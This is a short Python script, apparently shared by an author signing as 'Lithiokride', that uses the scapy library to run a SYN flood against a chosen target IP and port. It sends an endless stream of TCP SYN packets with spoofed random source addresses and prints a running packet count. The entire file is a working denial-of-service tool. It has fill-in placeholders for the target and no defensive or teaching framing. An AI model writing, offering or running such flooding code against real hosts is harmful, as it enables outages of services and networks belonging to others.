from scapy.all import IP, TCP, send
import random
import time
# Written by Lithiokride

# Target IP and Port
target_ip = "192.168.1.1"  # Replace with the target's IP
target_port = 80            # Replace with the target's port

# Function to create and send SYN packets
def syn_flood(target_ip, target_port):
    packet_count = 0  # Initialize packet counter
    
    try:
        # Send SYN packets in a loop
        while True:
            # Generate a random source IP address
            source_ip = f"192.168.1.{random.randint(1, 254)}"  # Change the range as needed

            # Create IP layer
            ip = IP(src=source_ip, dst=target_ip)

            # Create TCP layer with SYN flag set
            tcp = TCP(sport=random.randint(1024, 65535), dport=target_port, flags='S')

            # Create and send the packet
            packet = ip / tcp
            send(packet, verbose=0)
            packet_count += 1  # Increment the packet counter
            
            # Print packet count every 100 packets
            if packet_count % 100 == 0:
                print(f"Packets sent: {packet_count}")

    except KeyboardInterrupt:
        print(f"\nStopped. Total packets sent: {packet_count}")

# Start the SYN Flood
syn_flood(target_ip, target_port)
